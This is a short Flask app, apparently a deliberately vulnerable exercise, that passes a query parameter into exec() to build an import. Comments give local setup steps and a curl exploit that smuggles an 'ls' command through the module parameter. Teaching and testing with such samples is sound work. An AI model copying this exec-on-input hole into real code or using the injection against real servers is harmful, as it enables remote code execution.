from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    module = request.args.get("module")
    exec("import urllib%s as urllib" % module) # Noncompliant

# cd /home/fred/msi/ano2/VAITP/python_exercises/vuln
# . vaitp_env/bin/activate
# export FLASK_APP=app
# mv vul08_vuln_app.py app.py
# flask run
#
##exploit:
# curl http://127.0.0.1:5000/?module=\"; ls